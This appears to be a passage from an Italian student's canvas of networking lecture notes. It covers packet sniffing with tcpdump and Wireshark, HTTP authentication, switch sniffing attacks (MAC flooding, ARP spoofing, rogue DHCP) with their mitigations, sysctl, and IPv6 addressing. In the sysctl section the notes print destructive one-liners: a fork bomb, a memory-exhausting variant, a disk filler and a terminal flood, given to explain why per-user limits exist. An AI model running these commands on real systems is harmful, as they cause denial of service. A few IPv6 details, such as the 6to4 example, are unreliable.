","x":-7052,"y":10155,"width":759,"height":635,"color":"6"},
		{"id":"9aab84f55bbcd7b5","type":"text","text":"# Prima Sniffing, poi Decodifica\n\nUn programma come `dumpcap` o `tcpdump` usa le API di `libpcap` per\n\n- Aprire un socket `AF_PACKET` che riceve frame Ethernet grezzi (`SOCK_RAW`) di tutti i possibili protocolli (`ETH_P_ALL`):\n```C\nsocket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));\n```\n- Attivare la `promiscuous mode` sulla NIC:\n```C\nioctl(sock, SIOCSIFFLAGS, ...);\n```\n- Creare una memoria condivisa ad anello (***ring buffer***) tra `kernel` e `user`, in modo da poter leggere in `user mode` quello che scrive il `kernel` senza passare per le `syscall`;\n- Implementare dei ***Berkeley Packet Filters*** (***BPF***), i.e. limitare i pacchetti che il `kernel` scrive nel `ring buffer` (e.g. `tcpdump 'tcp port 80'` passa la stringa-filtro al `kernel`, il quale legge gli header per applicarlo). I pacchetti esclusi dai BPF vengono persi.\n\nPer quanto detto, un processo di ***sniffing*** è un'invocazione del tipo\n\n```bash\ndumpcap -i eth0 -w cattura.pcap\n```\n\nche scrive sul file `cattura.pcap` i dati Ethernet grezzi ricevuti dall'interfaccia `eth0`.\n\nI dati così ottenuti sono però degli ***hexdump*** (o meglio, file binari strutturati che vengono poi letti ed interpretati come `hexdump`). Qui `dumpcap` si ferma, mentre `tcpdump` va avanti. Se voglio capire cosa sto guardando ad alto livello devo ***decodificare*** il pacchetto, ed è a questo punto che entrano in gioco le strutture degli ***header***. Ognuno di essi mi dà informazioni su cosa c'è dopo (in particolare su dove si trova l'header successivo), oltre ovviamente a via via tutte le informazioni sul pacchetto.\n\n- ***Ethernet*** - Qui posso guardare `src` e `dst` (`MAC`), mentre `ethertype` mi dice cosa c'è nel payload (e.g. `0x0800` è in `IPv4`, `0x0806` è `ARP`);\n- ***IP*** - Indirizzi `IP` di `src` e `dst`, inoltre il campo `protocol` mi dice cosa aspettarmi per il livello di Trasporto (e.g. `protocol = 6` significa TCP);\n- ***Trasporto*** - Qua leggo le `porte` di `src` e `dst`, e in pratica ricostruisco il socket a cui è indirizzato il pacchetto;\n- ***Applicazione*** - Qui `tcpdump` inizia ad essere limitato, in quanto riesce ad interpretare solo alcuni protocolli, e spesso non del tutto (e.g. con `HTTP` si ferma alle intestazioni). Non è in grado di interpretare dati compressi o crittati (e.g. con ***TLS***).\n\n... quindi questo è tutto ciò che posso dire? No, posso fare molto di più. Il livello successivo è ***Wireshark***, che implementa la ***Deep Packet Inspection*** (***DPI***).","x":-6043,"y":9920,"width":759,"height":1105,"color":"4"},
		{"id":"20ce16025e72707f","type":"text","text":"# `tcpdump`\n\n```bash\ntcpdump [opzioni] [filtro BPF]\n```\n\nLe opzioni principali sono\n\n- `-i [interfaccia]` - Sceglie l'interfaccia da sniffare (e.g. `eth0`, `lo` per `loopback`);\n- `-c [N]` - Ferma la cattura dopo `N` pacchetti;\n- `-w [file]`, `-r [file]` - Scrive o legge un `file` in formato `.pcap`;\n- `-nm` - Non risolve i nomi, mostrando `IP` e `porte`;\n- `-v`, `-vv`, `-vvv` - Aumenta progressivamente la verbosità dell'output;\n- `-tt` - Mostra i timestamp assoluti;\n- `-X`, `-A` - Mostra anche i payload dei pacchetti, rispettivamente in `HEX` e in `ASCII`.\n\nI filtri principali sono invece\n\n- Per protocollo (e.g. `tcp`, `udp`, `icmp`, `ip6`);\n- Per porta (e.g. `port 80`);\n- Per host (e.g. host `192.168.1.1`);\n- Per sorgente/destinazione (e.g. `src port 22`).\n\nL'output ha ad esempio la seguente forma:\n\n- Timestamp (e.g. `12:34:56.789123`);\n- Protocollo di livello 3 (e.g. `IP`);\n- Sorgente.porta > Destinazione.porta (e.g. `192.168.1.2.443 > 192.168.1.100.53422:`);\n- Flags del protocollo di livello 4 (e.g. `Flags [P.]` sono le `flags Push` e `Ack` di `TCP`);\n- Seguono parametri opzionali se parliamo ad esempio di `TCP`:\n\t- Numeri di sequenza dei pacchetti (e.g. `seq 1234:1256`);\n\t- Numero di `Ack` (e.g. `ack 5678`);\n\t- Window Size (e.g. `win 501`);\n- Lunghezza dei payload (e.g. `length 22`, sottinteso `byte`).\n\nDiversi protocolli hanno ovviamente diversi formati di output, ad esempio abbiamo\n\n```bash\nARP, Request who-has 172.16.2.254 tell 172.16.2.2, length 28\n```\noppure\n\n```bash\nIP 172.16.2.2 > 172.16.2.254; ICMP echo request, id 9, seq 101, length 64\n```","x":-5034,"y":9920,"width":759,"height":1105,"color":"4"},
		{"id":"676c67e7ed61abe7","type":"text","text":"# `HTTP` Authentication\n\nNelle fasi primordiali di `HTTP` qualcuno si è reso conto che chiunque poteva accedere ai contenuti di un server. Da qui le idee di:\n\n- Suddividere ed etichettare le varie \"zone\" riservate di un server, con i ***realm***;\n- Richiedere per ogni `realm` un'***autenticazione*** con `username` e `password`.\n\nCome gestisco il processo di autenticazione?\n\n- ***Basic Authentication*** - Codifico con `Base64` la stringa `username:password` e la invio come campo dell'header (i.e. `Authorization: Basic base64(username:password)`);\n\t- Questa cosa ovviamente è una follia, perché ***manda continuamente tutto in chiaro*** (`base64` è una codifica, non una crittografia, i.e. è reversibile senza chiave). Chiunque intercetti un simile pacchetto può tranquillamente risalire a tutti i dati;\n\t- Non essendo previsti `nonce` o challenge, è vulnerabile ad ***attacchi replay***;\n\t- Diventa accettabile con `HTTPS` (che comunque non risolve il replay) o entro una rete privata in cui la sicurezza non è così importante;\n\t- Dalla cattura con `Wireshark` per `lab1 ex4` notiamo come lo scambio di dati sia molto rapido: `handshaking TCP`, `GET`, `200 OK` e chiusura della connessione.\n- ***Digest Authentication*** - La versione migliorata di Basic, che introduce i ***nonce***. Il client è \"costretto\" ad un primo messaggio esplorativo, al quale il server risponderà con un codice `401 Unauthoized` e la challenge \"`ecco un nonce (e.g. abc123), ora tu lo concateni alla password e applichi questa funzione di hash (e.g. MD5)`\".\n\t- La richiesta `Digest` del client, oltre alle cose ovvie, include l'`hash` complessivo (chiamato `response`), un valore `opaque` usato dal `server` per associare il `client` ad una sessione e che il `client` deve restituire identico, `qop` che indica la `Quality of Protection` (`auth` per crittare solo le credenziali, `auth-int` per l'`integrity`, i.e. per crittare anche il contenuto del `payload`), il `nonce count nc`, i.e. quante volte ho usato questo `nonce` e un `client nonce cnonce` usato solo dal client come protezione agli attacchi replay;\n\t- Non manda password in chiaro, né è vulnerabile ad attacchi replay (ad ogni richiesta cambia il `nonce`, quindi l'`hash`);\n\t- Più complicato e a volte mal supportato dai browser;\n\t- Tutto questo comunque protegge solo l'autenticazione, non il contenuto. È sempre preferibile usarlo con ***TLS***;\n\t- Dalla cattura con `Wireshark` per `lab1 ex4` notiamo come lo scambio di dati sia più lungo: anzitutto riceviamo un `401 Unauthorized`, la connessione viene chiusa e poi riaperta dal client quando invia la `password` protetta dalla challenge.","x":-10583,"y":11248,"width":759,"height":1105,"color":"4"},
		{"id":"9f5441a3edad0cc9","type":"text","text":"# `Wireshark` - Cose Aggiuntive\n\n**Arricchire l'Analisi: Configurazione Aggiuntiva (Esempio GeoIP)**\n\nUna volta catturato il traffico (si spera con metodi legittimi!), l'analisi può essere arricchita. Un esempio è la risoluzione GeoIP in Wireshark:\n\n- Configurando Wireshark per usare database GeoIP (come quelli gratuiti di MaxMind GeoLite2), è possibile mappare gli indirizzi IP pubblici visti nel traffico alla loro posizione geografica approssimativa (nazione, città).\n- Questo richiede di scaricare i database e indicare a Wireshark dove trovarli (tramite `Edit → Preferences → Name Resolution → MaxMind database directories`).\n- Una volta configurato, si possono usare filtri potenti come `ip.geoip.country == \"China\"` per isolare traffico da/verso specifiche aree geografiche, aggiungendo contesto all'analisi.\n\n# CTF con Wireshark\n\nry to solve with wireshark the CTF of Hack3rCon 3 conference (2012)\n\nhttp://sickbits.net/other/hc3.pcap-04.cap\n\nhttps://drive.google.com/file/d/1ANd0t_U7Ya8R1fppcHhi51WYq9FjltM6/view?usp=drive_web&authuser=0\n\nè una cattura di pacchetti wifi dalla quale si può estrapolare una password, decrittare tutto il traffico e trovare la flag\n\n## cyberX? Una roba di ethical hacking con Leonardo","x":-8061,"y":12588,"width":759,"height":1105,"color":"1"},
		{"id":"9d40d5615a7f5616","type":"text","text":"# Cattura Standard o Aggressiva?\n\nOk, bella la promiscuous mode, ma se sei collegato ad uno ***switch*** è abbastanza inutile. Se i vecchi ***hub*** mandavano tutto a tutti, ora la rete è intelligente e multiplexa sulle porte. Ci sono però un paio di metodi per reindirizzare tutto il traffico su una porta di controllo:\n\n- ***Test Access Point*** (***TAP***) - Se ho accesso alla rete fisica, un TAP è un oggettino che si aggiunge tra router e switch e che copia il traffico senza interferire con esso;\n- ***Port Mirroring*** - Se lo switch è programmabile (***managed switches***), posso copiare direttamente tramite lui il traffico di porte o intere VLAN su una porta target su cui mi collego con Wireshark (o chi per lui).\n\nAltrimenti mi devo inventare qualcosa di meno pulito.\n\n- ***MAC Flooding*** - Bombardo lo switch con annunci di associazioni `(IP, Porta)` a caso. Ad un certo punto la cache CAM si riempie e inizia ad eliminare le associazioni più vecchie. Questo implica che il prossimo pacchetto destinato agli `IP` legittimi non troverà più una porta corrispondente, quindi lo switch va in ***fall-open***, i.e. regredisce alla fase di apprendimento delle associazioni ed è costretto a fare ***broadcast***. Tradotto, i pacchetti arriveranno anche a me che ascolto in promiscuous mode;\n\t- Chiaro che questa cosa ha una falla: appena il pacchetto arriva all'host giusto, questo risponde con un `ACK` e lo switch impara nuovamente l'associazione. Bisognerebbe quindi ricominciare da capo, a meno che non gioco d'anticipo facendo ***ARP Spoofing***, i.e. prima che il vero `IP Target` risponda, mi pubblicizzo io come `IP Target` sulla mia porta fisica (e.g. tramite `ettercap` o `cain&abel`, sfruttando un messaggio di `gratuitous ARP response`);\n\t- O meglio, di falle ne ha almeno due: uno switch vagamente più intelligente può definire un numero massimo di `MAC` provenienti da una singola porta fisica, in modo tale che se provi a mandarne un miliardo vieni bloccato. Non solo: potrebbe essere così stupido da freezarsi completamente, e addio sniffing perché la rete è morta;\n\t- Posso mitigare questa cosa con una ***Dynamic ARP Inspection*** (***DAI***), i.e. controllo le nuove associazioni `(IP, MAC)` cercando di individuare l'***ARP Poisoning***;\n\t- Si realizza con strumenti come `macof` (prima implementazione, 1999) e `dsniff`.\n- ***DHCP Redirection*** - Aggiungo e pubblicizzo un server DHCP \"rogue\" (non autorizzato) sulla LAN, che inizia a richiedere un botto di `IP` al server legittimo portando alla ***DHCP Starvation*** (i.e. esaurisco gli `IP` della LAN secondo il server legittimo). A chi chiede un'assegnazione al rogue, quello risponde indicando l'`IP` dell'attaccante come default gateway. Ora tutto il traffico passa da me;\n\t- Effetto simile posso ottenerlo abusando del messaggio `redirect` di ***ICMP*** (`type 5`), usato dai router per pubblicizzare una rotta migliore. Di nuovo, `ettercap`;\n\t- Posso mitigare il problema definendo sullo switch delle porte \"trusted\". In questo modo so dove sono i server legittimi, e blocco i messaggi provenienti dai rogue.\n\nCi sono altri modi per realizzare ciò, ne parliamo meglio nel laboratorio ***Link-Local Attacks***.","x":-7052,"y":11248,"width":759,"height":1105,"color":"4"},
		{"id":"eb599150771640c2","type":"text","text":"# `sysctl`\n\nIl `kernel`, si fa, *fa cose*. Le decisioni prese da questo enorme ammasso di algoritmi dipendono da ***parametri*** che specificano cose tipo `quanto a lungo devo tenere in cache una pagina?` o `devo inoltrare i pacchetti IP da eth0 a eth1?`. Questi parametri possono essere specificati in tre modi:\n\n- All'avvio, tramite ***grub***. Sono specificati alla riga `GRUB_CMDLINE_LINUX_DEFAULT` in `/etc/default/grub`, ne sono esempi `quiet` (silenzia i messaggi del `kernel` all'avvio, i.e. quelli che vedi apparire a spam in alcune distro mentre carica il SO), `nomodeset` (disabilita il driver video del `kernel`), `init=/bin/bash` (invece di far partire il SO con il processo `init` fornisce all'utente una shell, tendenzialmente per recovery/debug). Per rendere effettive eventuali modifiche a questi parametri, `sudo update-grub && reboot`;\n- Al caricamento di un ***modulo del kernel***, i.e. un file `.ko` (`kernel object`). Si modificano con il comando `modprobe` o dal file `/etc/modprobe.d/modulename.conf`;\n- A ***runtime***, tramite strumenti come `sysctl` o comandi come `ip` (cfr. ***Comando `ip`***). In genere questi parametri gestiscono cose come lo `swap` (e.g. `vm.swappiness`) o il packet forwarding (e.g. `net.ipv4.ip_forward`).\n\nVi possono poi essere parametri specificabili in altri punti del sistema, ma limitiamoci al nostro protagonista. `sysctl` è un comando che consente modifiche direttamente da `Shell`. Posso ad esempio abilitare il routing `IPv6` dicendo\n\n```bash\nsysctl -w net.ipv6.ip_forward=1\n```\n\nMa questi parametri vivono anche come ***filesystem virtuale*** in `/proc/sys`, quindi fare\n\n```bash\necho 1 > /proc/sys/net/ipv6/ip_forward\n```\n\nprodurrà esattamente lo stesso risultato del comando sopra. Ovviamente, essendo il primo un comando ha una serie di controlli che ti impediscono di fare troppi danni (nonché di avere visione d'insieme, e.g. con l'opzione `-a` vedi tutti i parametri), mentre nel secondo caso hai totale libertà di modificare e fare disastri. \n\nEntrambi questi metodi hanno un unico problemino: non sono persistenti se faccio un `reboot`. Per ovviare a questa cosa devo modificare invece il file `/etc/sysctl.conf` (è in `/etc` che il `kernel` va a pescare le configurazioni di sistema permanenti, infatti tutto ciò che non si modifica a runtime nell'elenco sopra ha un `path` che inizia con `/etc`).\n\nOvviamente non serve scomodare tutta questa roba per settare i parametri del `kernel`. Una GUI (e.g. le configurazioni di rete in impostazioni) può tranquillamente ottenere lo stesso risultato con un semplice click.","x":-10580,"y":12588,"width":759,"height":1105,"color":"6"},
		{"id":"c458828e446d076f","type":"text","text":"# Modalità Bridged\n\nOgni `VM` si connette alla rete dell'`host` tramite la ***modalità bridged***, i.e. \"estendendo\" il cavo `ethernet` dell'`host` e collegandosi alla stessa interfaccia. In questo caso, il `router` vedrà la `VM` come un secondo `host` connesso sulla stessa interfaccia, e gli assegnerà un `IP` unico sulla sua `LAN`.\n\nTutto questo potrebbe rompersi se l'`host` è connesso in `WiFi`. Per come funziona, `WiFi` ha bisogno di un `MAC` univoco per ogni connessione, e se crei un'interfaccia virtuale di tipo `bridge` (e.g. `br0`) la scheda `WiFi` (interfaccia `wlan0`) potrebbe letteralmente rifiutarsi e scartare i pacchetti diretti a questo secondo `MAC` fittizio che non è il suo. Inoltre, potrebbe essere il `router` stesso a non accettare una situazione di tipo \"stesso client, diversi `MAC`\".\n\nCi sono diverse soluzioni a questa cosa, tra cui `NAPT` (i.e. traduzione degli indirizzi a livello di rete) e l'uso di un'interfaccia `TAP` (`Terminal Access Point`, che in pratica simula un cavo `ethernet` virtuale tra `VM` e `host`, contrapposto ad una rete `TUN`). In pratica, se l'`host` è connesso in `WiFi` e vuole far funzionare un bridge si deve comportare da `router`.\n\nOra, Linux ha un suo sistema di Bridges (`Linux Bridges`) integrato nel kernel. Per creare la propria rete tra `container`, Katharà può scegliere di appoggiarsi su questo sistema.\n\nL'alternativa è un sistema più complesso, basato su un SW che gira in `user mode` detto `VDE` (`Virtual Distributed Ethernet`). Questo metodo richiede configurazione aggiuntiva, perché simula il comportamento di uno switch (quindi dovrei definire CAM Tables, VLAN, e altre cose simpatiche).\n\nVisto che non ci va di configurare cose in più, usiamo `katharamp` invece di `katharamp_vde` in `Docker Network Plugin Version` (`kathara settings`).","x":-10579,"y":7440,"width":759,"height":924,"color":"4"},
		{"id":"0654efafad655f4a","type":"text","text":"# Tipologie di parametri\n\nDentro `/proc/sys` troviamo una gerarchia concettuale per la semantica dei parametri, che si sviluppa lungo le sottocartelle:\n\n- `net/` - La più usata, definisce i [parametri](https://docs.kernel.org/networking/ip-sysctl.html) di ***rete***. Ha quindi sottocartelle come `ipv4/`, `ipv6/`, `netfilter/` (i.e. `Firewall/NAT` basato su `iptables`) o `core/` (i.e. opzioni trasversali ai protocolli, e.g. quante connessioni `TCP` accetto);\n- `vm/` - Letteralmente `Virtual Memory`, gestisce allocazione e swap per la RAM;\n\t- Se finisco sia RAM che swap il sistema va in ***OOM*** (***Out of Memory***), che di norma viene gestito con un processo ***OOM Killer*** (chiama delle `kill` sui processi che consumano molta memoria). Si vede dai log di sistema, tipo `invoked oom-killer`.\n- `fs/` - `filesystem`, regola cose tipo massimo numero di file apribili in contemporanea, massimo numero di directory monitorabili da un processo `inotify`, log e simili;\n- `kernel/` - Autoesplicativo, i parametri vanno dal nome `host` del sistema a quanti secondi aspettare prima di riavviare il sistema dopo un `kernel panic`;\n\t- Quando il `kernel` incontra un errore non recuperabile e talmente grave che non può continuare in sicurezza, va letteralmente nel panico. Un ***kernel panic*** è un crash totale del sistema (e.g. BSOD su Windows) che in pratica ti sta dicendo `prima di fare danni peggiori, io fermo tutto`.\n- `dev/` - Qui ci sono eventualmente i parametri dei `device` HW esterni, e.g. per i driver;\n- `user/` - ***Limiti*** globali per ciascun utente del sistema, tendenzialmente per impedire loro di fare danni, tipo ***DoSsare*** (volontariamente o meno) il sistema. Questo viene fatto impedendo di aprire troppi processi (***fork bomb***, bloccato dal parametro `ulimit`), file, mappature di memoria e simili. \n\t- Un modo molto semplice per implementare una fork bomb è `:(){ :|:& };:`, i.e.\n\t\t- `:()` definisce una funzione chiamata `:`;\n\t\t- `{ :|:& };` è il corpo della funzione, che chiama se stessa due volte in pipe, rimanendo in background;\n\t\t- `:` esegue la funzione appena definita e ne fa partire un numero esponenziale.\n\t- Una variante per esaurire la RAM e portare ad OOM è `:(){ x=$(yes); :|:& };:`, dove `yes` è una roba che stampa a spam \"`y\\n`\" (i.e. in pratica assegno in modo ricorsivo ad `N` variabili un gran quantitativo di memoria);\n\t\t- Se ti stai chiedendo per quale strano motivo esista un comando come `yes`, pare sia stato fatto per rispondere in automatico `y` ai comandi che richiedevano interazione umana per proseguire (e.g. `yes | fsck /dev/sda`, che chiede conferma per ogni errore trovato sul disco).\n\t- Posso poi saturare il disco con `yes > file.txt` o distruggere un terminale con `cat /dev/urandom > /dev/tty`. Insomma, ci sono molte cose che bisogna limitare quando parliamo di utenti.","x":-11592,"y":12588,"width":759,"height":1105,"color":"4"},
		{"id":"33c3d2193ec229bc","type":"text","text":"# Struttura di un Indirizzo `IPv6`\n\nOgni indirizzo `IPv6` è *de facto* gerarchicamente diviso secondo la \"***3-1-4 rule***\":\n\n- I primi `3` gruppi di `HEX` (***prefix***) individuano la ***rete*** (i.e. $2^{48}$ possibili reti);\n- Il successivo individua la ***sottorete*** (i.e. $2^{16}$ possibili sottoreti per ogni rete);\n- Gli ultimi `4` (***interface ID***) individuano l'***host*** (i.e. $2^{64}$ possibili host per ogni sottorete).\n\nNota che questa divisione è fissa, i.e. non esistono subnet mask di lunghezza variabile. I gruppi sono separati da `:`, e ci sono due regole per scrivere meno roba possibile:\n\n- Ometti gli zeri iniziali nei gruppi (i.e. al posto di `0100` puoi scrivere `100`);\n- Comprimi la più lunga sequenza di zeri con doppio `:` (i.e. `1000:0000:0000:0100` diventa `1000::100`, non posso eliminare i tre zeri di `1000` perché sono significativi!).\n\t- Se ci sono due sequenze uguali si comprime solo la prima.\n\nSegue che\n\n```\n2001:0DB8:AAAA:1110:1000:0000:0000:0100 -> 2001:0DB8:AAAA:1110:1000::100\n```\n\nDiversi prefissi (i.e. i primi `3 bit`) di un indirizzo `IPv6` definiscono diverse ***classi di indirizzi***, i.e. diversi usi a cui sono adibiti (come voleva fare inizialmente `IPv4`).","x":-12601,"y":14724,"width":759,"height":829,"color":"4"},
		{"id":"478dab62989780f8","type":"text","text":"# ... e gli Unique Local?\n\nGli indirizzi ULA, essendo destinati solo all'uso locale e non instradabili globalmente, **non vengono tipicamente annunciati dai router negli RA insieme ai prefissi globali per l'autoconfigurazione SLAAC \"standard\"**. Il router di bordo non \"possiede\" un prefisso ULA da distribuire nel senso di un prefisso globale assegnato.\n\n**Come vengono configurati gli indirizzi ULA?**\n\nLa configurazione degli indirizzi ULA avviene in modo separato dalla configurazione dei GUA tramite RA/SLAAC. Ci sono principalmente due modi:\n\n1. **Configurazione Manuale o Tramite Script:** L'amministratore di rete può configurare manualmente gli indirizzi ULA sugli host o utilizzare script. Questo è meno comune per un gran numero di dispositivi.\n2. **DHCPv6:** Un server DHCPv6 può essere configurato per assegnare indirizzi ULA agli host sulla rete locale. Questa è la modalità più comune per distribuire indirizzi ULA in modo centralizzato. Un host richiederebbe un indirizzo ULA al server DHCPv6, in modo simile a come un client IPv4 richiede un indirizzo a un server DHCP.\n3. **Autoconfigurazione ULA (meno comune nello scenario RA/SLAAC per GUA):** Sebbene meno comune nello scenario di coexistenza con GUA tramite RA, tecnicamente un host potrebbe generare un prefisso ULA e un indirizzo ULA per sé, ma questo non è il meccanismo standard previsto dagli RA per la connettività globale.\n\n**L'ULA richiede comunque DAD?**\n\n**Assolutamente sì.** Indipendentemente da come un host ottiene il suo indirizzo ULA (manuale, DHCPv6, ecc.), è **essenziale** che l'host esegua il **Duplicate Address Detection (DAD)** per quell'indirizzo sul link locale prima di iniziare a utilizzarlo pienamente.\n\n**Perché?**\n\nAnche se gli indirizzi ULA sono progettati per essere globalmente unici per evitare collisioni tra reti private diverse, è comunque possibile (anche se molto improbabile con la generazione pseudorandomica di un prefisso) o, più realisticamente, a causa di errori di configurazione manuale o malfunzionamenti di un server DHCPv6, che due dispositivi sullo stesso link locale finiscano per tentare di utilizzare lo stesso indirizzo ULA.\n\nIl DAD per l'indirizzo ULA funziona esattamente come il DAD per l'indirizzo Link-Local o il GUA generato via SLAAC: l'host invia un messaggio Neighbor Solicitation (NS) per l'indirizzo ULA che intende utilizzare. Se un altro nodo sul link sta già usando quell'indirizzo, risponderà con un Neighbor Advertisement (NA), indicando il duplicato.","x":-15628,"y":14724,"width":759,"height":829,"color":"2"},
		{"id":"1d0acbc9119f8702","type":"text","text":"# Assegnazione degli Indirizzi `IPv6`\n\nAbbiamo capito che\n\n- Un ***Link Local*** deve essere ***unico sul collegamento fisico***;\n- Un ***Unique Local*** deve essere ***unico sulla subnet***;\n- Un ***Global Unicast*** deve essere ***unico su Internet***.\n\nCome faccio ad assegnare indirizzi unici?\n\n1. Genero un indirizzo ***Link Local*** univoco sul collegamento fisico (e.g. `FE80::CAFE`);\n2. Ora sono raggiungibile sul link fisico, quindi sono in grado di comunicare con il ***router***. Questa conversazione può partire in due modi diversi:\n\t- ***Router Advertisement*** (***RA***) - Il router si pubblicizza con messaggi periodici sul link tramite un messaggio ***ICMPv6*** `Type 134`. Il destinatario è l'indirizzo ***multicast*** `FF02::1`, i.e. `All Hosts` (non è un broadcast perché gli altri router sono esclusi);\n\t- ***Router Solicitation*** (***RS***) - Se non ho voglia di aspettare il prossimo RA, posso far partire io la conversazione con un messaggio `ICMPv6 Type 133` inviato a `FF02::2` (i.e. tutti e soli i router). La risposta sarà un messaggio di RA ***unicast*** diretto a me;\n3. Ricevere il messaggio del router significa scoprire il ***prefisso di rete*** della mia LAN (nonché l'indirizzo del ***default gateway*** e altri parametri di connessione). A partire da questo posso generare un ***Global Unicast***, in tre modi:\n\t- ***Stateful DHCPv6*** - Il messaggio di RA mi fornisce l'`IP` di un server `DHCPv6` (non per forza sulla stessa LAN: in questo caso, è il router stesso ad offrirsi di fare da tramite), mi affido a lui per tutto (esattamente come in `DHCPv4`);\n\t- ***StateLess Address Auto Configuration*** (***SLAAC***) - Visto che ho generato i `64 bit` di host in modo univoco per l'indirizzo Link Local, posso provare ad aggiungere a questi stessi `bit` il prefisso di rete e sperare (i.e. controllando con DAD) che questo sia unico entro la LAN (se lo è entro la LAN lo è anche in tutto Internet). Ci sono in realtà diversi modi per generare con SLAAC, cfr. ***Laboratorio 2*** `Ex2`;\n\t- ***Stateless DHCPv6*** - Un mix tra `SLAAC` e un `DHCPv6` stateful, usa il primo per `IP` e `default gateway` ed il secondo per il resto dei parametri (e.g. server `DNS`, cfr. ***Laboratorio 2*** `Ex3`).\n","x":-14619,"y":14724,"width":759,"height":829,"color":"4"},
		{"id":"faa7a7d081f0062d","type":"text","text":"# DHCPv6 & Prefix Delegation\n\nserver DHCP può essere non nella stessa rete. il router fa da tramite.\n\nIn realtà quando uso DHCP potrei dover mandare un multicast a tutti i server, perché potrei non sapere l'`IP`.\n\nPD è Come GUA assignment, ma chiedo N indirizzi. fatto in genere dai router che sanno di avere degli hosts dietro (anche io posso essere il router della mia casa domotica, per esempio). Faccio prefix delegation request.\n\nRA = Router Advertisement\n\nfa le veci di IANA tipo\n\ndi base ti dicono \"tiè, fai tu\"\n\nPosso richiedere ad Iliad e Fastweb un'intera rete IPv6 (utile per IoT?)","x":-14619,"y":15788,"width":759,"height":557},
		{"id":"920967296878cb3a","type":"text","text":"# Divisione degli Indirizzi `IPv6`\n\nCome in `IPv4`, anche qui diversi prefissi sono adibiti a diverse cose, ma stavolta sul serio. La IANA ha diviso la torta degli indirizzi in otto gruppi uguali (`bit` iniziali `000`, `001`, `010`, `011`, ...). `5` di queste fette sono totalmente inutilizzate, le restanti sono:\n\n- Tutto ciò che inizia con i bit `001` (i.e. il primo `hex` del primo gruppo è `2` o `3`, quindi sono tutti gli indirizzi da `2000::/64` a `3fff:ffff:ffff:ffff::/64`) è un ***Global Unicast Address*** e costituiscono quindi un ottavo di tutti i possibili indirizzi;\n- La fetta di torta degli `IPv6` che iniziano con `000` è così divisa:\n\t- `::/128` è ***unspecified*** (i.e. `non ho un IP, sono in fase di configurazione`);\n\t- `::1` è l'indirizzo di ***loopback***. Solo uno? Sì, non aveva alcun senso avere un'intera rete da $2^{24}$ indirizzi dedicata a questo (quando hanno fatto `IPv4` non avevano idea della direzione in cui si sarebbero sviluppate queste cose, quindi nel dubbio ne hanno riservati un botto. Ad oggi sappiamo che ne basta quasi sempre uno solo);\n- La fetta `111` è così divisa:\n\t- `FC00::/7` (i.e. iniziano con `1111 110`) sono ***Unique Local Addresses***, i.e. gli ***indirizzi privati di `IPv4`***. In teoria si dividono a loro volta in due gruppi:\n\t\t- `FC00/8`, se vengono allocati da un server centrale (mai implementato);\n\t\t- `FD00/8`, se vengono assegnati in qualsiasi altro modo (è quello che si usa).\n\t- `FE80::/10` (i.e. iniziano con `1111 1110 10`, quindi vanno da `fe80:roba` fino a `febf:roba`) sono ***Link-Local Addresses*** (in pratica sono indirizzi ***MAC***);\n\t\t- Nota che gli indirizzi da `fe00:roba` a `fe7A:roba` non sono assegnati, quindi tendenzialmente riconosci un Link-Local perché inizia per `fe`.\n\t- `FF00::/8` (i.e. partono sempre con `FF`) sono indirizzi di ***Multicast***, che includono gli indirizzi di tipo ***Solicited Node*** (`FF02::1:FF00:0000/104`) \"utili\" (...) ad implementare il protocollo di ***Neighbor Discovery***;\n\t\t- Qui c'è *quasi* un indirizzo di broadcast, i.e. `FF02::1` (`to all IPv6 devices`).\n\t- Un `111` iniziale significa che la prima lettera può essere sia una `E` che una `F`. Gli indirizzi che partono con `E` non sono stati assegnati, così come quelli che vanno da `F0` iniziale a `FC00` escluso: di questa fetta sono assegnati solo alcuni spicchi.","x":-13610,"y":14724,"width":759,"height":829,"color":"4"},
		{"id":"a3f0b1fb4d585e4d","type":"text","text":"# Global Unicast Address (GUA)\n\nI ***GUA*** Corrispondono agli ***indirizzi pubblici di `IPv4`***, e implementano la loro idea iniziale: ogni oggetto su Internet è univocamente determinato da un indirizzo `IP`.\n\nIl sottogruppo `2001:DB8::/32` è dedicato alla \"***documentazione***\", i.e. ad usi tecnici e accademici. Questi indirizzi non vengono instradati su Internet_v6;\n\nIl sottogruppo `2002::/16` (***6to4***) era in origine dedicato alla retrocompatibilità con `IPv4`. Vale a dire, prendo un `IPv4` (e.g. `192.88.99.1`) e lo scrivo in esadecimale (e.g. `C058:6301`). L'`IPv6` associato a questo `IPv4` è `2001:C058:6301::/48`.\n\n`::FFFF:0:0/96` è simile a `6to4`, ad oggi non si usa quasi più.\n","x":-13610,"y":15788,"width":759,"height":557},
		{"id":"ae0f762d5fa6d78a","type":"text","text":"# SPACING","x":-12851,"y":14724,"width":250,"height":235,"color":"5"},
		{"id":"829e7a360cd16a1f","type":"text","text":"# Neighbor Discovery Protocol (NDP)\n\nIl protocollo `IPv6` ha a questo punto bisogno di due cose:\n\n- Sostituire il protocollo `ARP` per trovare l'indirizzo `MAC` dato l'indirizzo `IPv6`. I Link Local sono infatti indirizzi logici, mi serve ancora un indirizzo fisico per far funzionare il DLL, e non ci piace un protocollo a livello `IP` che si poggia su `Ethernet`;\n- Assicurarsi che i Link Local e i GUA assegnati con SLAAC siano unici.\n\nOltre ai già menzionati `RA` e `RS`, `ICMPv6` aggiunge altri tre tipi messaggi per implementare i protocolli complessivamente detti di ***Neighbor Discovery***.\n\n- ***Neighbor Solicitation*** (***NS***, `Type XXX`) - per implementare diversi protocolli:\n\t- Scegliendo come destinatario un ***Solicited Node Address***, tramite una NS posso richiedere il `MAC` di un host in LAN di cui conosco solo il GUA (i.e. sostituisce `ARP`): nonostante l'esistenza del Link Local, il DLL di `TCP/IP` usa ancora il `MAC`;\n\t- ***Duplicate Address Detection*** (***DAD***) - Prima di utilizzare un Link Local o un GUA mando un NS a tale indirizzo e vedo se qualcuno risponde con un NA.\n- ***Neighbor Advertisement*** (***NA***) - Tendenzialmente viene inviato in risposta ad un NS, posso scegliere di mandarlo per primo (***unsolicited***) per annunciare il mio `MAC`;\n- ***Redirect*** - Come in `ICMPv4`, se c'è una rotta migliore il router avvisa l'host.","x":-14619,"y":13932,"width":759,"height":557,"color":"4"},
